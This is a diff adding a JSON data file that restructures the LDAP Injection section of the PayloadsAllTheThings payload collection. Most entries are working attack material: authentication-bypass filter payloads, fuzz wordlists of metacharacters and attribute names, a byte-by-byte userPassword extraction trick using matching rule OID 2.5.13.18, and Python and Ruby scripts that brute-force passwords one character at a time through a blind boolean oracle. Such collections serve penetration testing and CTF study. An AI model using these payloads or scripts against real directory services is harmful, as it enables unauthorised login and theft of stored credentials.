@@ -1,0 +1,135 @@
+{
+  "category": "LDAP Injection",
+  "source": "PayloadsAllTheThings/LDAP Injection/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What LDAP injection is and where to look",
+      "language": "text",
+      "tags": ["methodology", "ldap", "recon"],
+      "body": "LDAP injection occurs when user input is placed into an LDAP filter without escaping. Through a local proxy the attacker changes the filter logic by adding their own conditions.\n\nWhere to look:\n• Login forms (login / username + password) - the typical target for authentication bypass.\n• Directory search fields (search, dir, cn, mail).\n• Any input that ends up in a query of the form (&(uid=INPUT)(...)).\n\nExploitation idea: first inject the special characters * ( ) | & and break the filter, then fine-tune the conditions so as to get always-true or to extract attributes one character at a time (blind)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "LDAP filter special characters (RFC 4515)",
+      "language": "table",
+      "tags": ["ldap", "syntax", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Character", "Purpose in the filter"],
+          "rows": [
+            ["&", "logical AND - all nested conditions must be true"],
+            ["|", "logical OR - one true condition is enough"],
+            ["!", "logical NOT - negation of a condition"],
+            ["=", "equality of an attribute to a value"],
+            ["*", "wildcard - any sequence of characters (including an \"attribute exists\" check)"],
+            ["(", "opening of a subexpression / condition"],
+            [")", "closing of a subexpression / condition"],
+            ["\\xx", "escaped byte (hex), needed for OCTET STRING and special characters"],
+            ["%00", "NULL byte - cuts off the \"tail\" of the original filter"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Authentication bypass",
+      "title": "Always-true via (uid=*) - example 1",
+      "language": "text",
+      "tags": ["auth-bypass", "wildcard"],
+      "body": "user  = *)(uid=*))(|(uid=*\npass  = password\nquery = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
+    },
+    {
+      "subcategory": "Authentication bypass",
+      "title": "Bypass via negation (!(&(1=0 - example 2",
+      "language": "text",
+      "tags": ["auth-bypass", "filter-injection"],
+      "body": "user  = admin)(!(&(1=0\npass  = q))\nquery = (&(uid=admin)(!(&(1=0)(userPassword=q))))"
+    },
+    {
+      "subcategory": "Authentication bypass",
+      "title": "Ready-made wildcard payloads for the login field",
+      "language": "text",
+      "tags": ["auth-bypass", "wildcard", "fuzz"],
+      "body": "*\n*)(uid=*))(|(uid=*\nadmin*\nadmin*)((|userPassword=*)\nadmin*)((|userpassword=*)\n*(|(mail=*))\n*(|(objectclass=*))"
+    },
+    {
+      "subcategory": "Filter injection",
+      "title": "Injecting an additional attribute: *)(ATTR=*",
+      "language": "text",
+      "tags": ["filter-injection", "wildcard"],
+      "body": "Injection template for appending a condition to the filter:\n\n*)(ATTRIBUTE_HERE=*\n\nInstead of ATTRIBUTE_HERE substitute directory attributes (see the list below). This way you can check for the existence of attributes and change the logic of the original (&(login=...)(password=...))."
+    },
+    {
+      "subcategory": "Filter injection",
+      "title": "Standard LDAP attributes for injection",
+      "language": "text",
+      "tags": ["filter-injection", "attributes", "reference"],
+      "body": "userPassword\nsurname\nname\ncn\nsn\nobjectClass\nmail\ngivenName\ncommonName"
+    },
+    {
+      "subcategory": "Filter injection",
+      "title": "Extended dictionary of attribute names (for brute-forcing fields)",
+      "language": "text",
+      "tags": ["filter-injection", "attributes", "wordlist"],
+      "body": "c\ncn\nco\ncommonName\ndc\nfacsimileTelephoneNumber\ngivenName\ngn\nhomePhone\nid\njpegPhoto\nl\nmail\nmobile\nname\no\nobjectClass\nou\nowner\npager\npassword\nsn\nst\nsurname\nuid\nusername\nuserPassword"
+    },
+    {
+      "subcategory": "Special characters and wildcards",
+      "title": "Fuzz dictionary of LDAP metacharacters (raw + URL-encoded)",
+      "language": "text",
+      "tags": ["fuzz", "wildcard", "wordlist"],
+      "body": "*\n*)(&\n*))%00\n)(cn=))\\x00\n*()|%26'\n*()|&'\n*(|(mail=*))\n*(|(objectclass=*))\n*)(uid=*))(|(uid=*\n*/*\n*|\n/\n//\n//*\n@*\n|\n&\n(\n)\n!\nadmin*\nadmin*)((|userpassword=*)\nadmin*)((|userPassword=*)\nx' or name()='username' or 'x'='y\n%21\n%26\n%28\n%29\n%2A%28%7C%28mail%3D%2A%29%29\n%2A%28%7C%28objectclass%3D%2A%29%29\n%2A%7C\n%7C"
+    },
+    {
+      "subcategory": "Special characters and wildcards",
+      "title": "The userPassword attribute is an OCTET STRING, not a string",
+      "language": "text",
+      "tags": ["userpassword", "octet-string", "advanced"],
+      "body": "userPassword is not a string (like cn) but an OCTET STRING. In LDAP every object/type/operator is addressed via an OID. For bit-by-bit comparison the matching rule octetStringOrderingMatch (OID 2.5.13.18) is used: it compares two octet strings bit by bit (big endian) until it finds a difference; a value with a zero bit is considered less than a value with a one bit.\n\nThis lets you blind-brute-force the password byte by byte via an extensible match."
+    },
+    {
+      "subcategory": "Special characters and wildcards",
+      "title": "Brute-forcing userPassword byte by byte via OID 2.5.13.18",
+      "language": "text",
+      "tags": ["userpassword", "octet-string", "extraction"],
+      "body": "userPassword:2.5.13.18:=\\xx (\\xx is a byte)\nuserPassword:2.5.13.18:=\\xx\\xx\nuserPassword:2.5.13.18:=\\xx\\xx\\xx"
+    },
+    {
+      "subcategory": "Blind boolean extraction",
+      "title": "Character-by-character password brute-force via wildcard",
+      "language": "text",
+      "tags": ["blind", "boolean", "extraction"],
+      "body": "The filter responds differently to a matching/non-matching prefix - that is the oracle. We brute-force characters as in a binary search:\n\n(&(sn=administrator)(password=*))    : OK\n(&(sn=administrator)(password=A*))   : KO\n(&(sn=administrator)(password=B*))   : KO\n...\n(&(sn=administrator)(password=M*))   : OK\n(&(sn=administrator)(password=MA*))  : KO\n(&(sn=administrator)(password=MB*))  : KO\n...\n(&(sn=administrator)(password=MY*))  : OK\n(&(sn=administrator)(password=MYA*)) : KO\n(&(sn=administrator)(password=MYB*)) : KO\n(&(sn=administrator)(password=MYC*)) : KO\n...\n(&(sn=administrator)(password=MYK*)) : OK\n(&(sn=administrator)(password=MYKE)) : OK"
+    },
+    {
+      "subcategory": "Blind boolean extraction",
+      "title": "Breakdown of the blind filter",
+      "language": "text",
+      "tags": ["blind", "boolean", "reference"],
+      "body": "• &                  logical AND - all the conditions inside must be true.\n• (sn=administrator)  matches records where the attribute sn (surname) = administrator.\n• (password=X*)       matches if password starts with X (case-sensitive). * is a wildcard for any remainder.\n\nBy iterating X from A to Z, then adding the next character, you build up the whole value from the OK/KO reaction."
+    },
+    {
+      "subcategory": "Blind exfiltration",
+      "title": "Finding valid LDAP fields (Python)",
+      "language": "python",
+      "tags": ["blind", "field-discovery", "script"],
+      "body": "#!/usr/bin/python3\nimport requests\nimport string\n\nfields = []\nurl = 'https://URL.com/'\nf = open('dic', 'r')\nworld = f.read().split('\\n')\nf.close()\n\nfor i in world:\n    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\\x00)(password=bla))\n    if 'TRUE CONDITION' in r.text:\n        fields.append(str(i))\n\nprint(fields)"
+    },
+    {
+      "subcategory": "Blind exfiltration",
+      "title": "Blind exfiltration of a value character by character (Python)",
+      "language": "python",
+      "tags": ["blind", "extraction", "script"],
+      "body": "#!/usr/bin/python3\nimport requests, string\nalphabet = string.ascii_letters + string.digits + \"_@{}-/()!\\\"$%=^[]:;\"\n\nflag = \"\"\nfor i in range(50):\n    print(\"[i] Looking for number \" + str(i))\n    for char in alphabet:\n        r = requests.get(\"http://ctf.web?action=dir&search=admin*)(password=\" + flag + char)\n        if (\"TRUE CONDITION\" in r.text):\n            flag += char\n            print(\"[+] Flag: \" + flag)\n            break"
+    },
+    {
+      "subcategory": "Blind exfiltration",
+      "title": "Blind exfiltration of a value character by character (Ruby, @noraj)",
+      "language": "ruby",
+      "tags": ["blind", "extraction", "script"],
+      "body": "#!/usr/bin/env ruby\nrequire 'net/http'\nalphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')\n\nflag = ''\n(0..50).each do |i|\n  puts(\"[i] Looking for number #{i}\")\n  alphabet.each do |char|\n    r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\"))\n    if /TRUE CONDITION/.match?(r)\n      flag += char\n      puts(\"[+] Flag: #{flag}\")\n      break\n    end\n  end\nend"
+    }
+  ]
+}
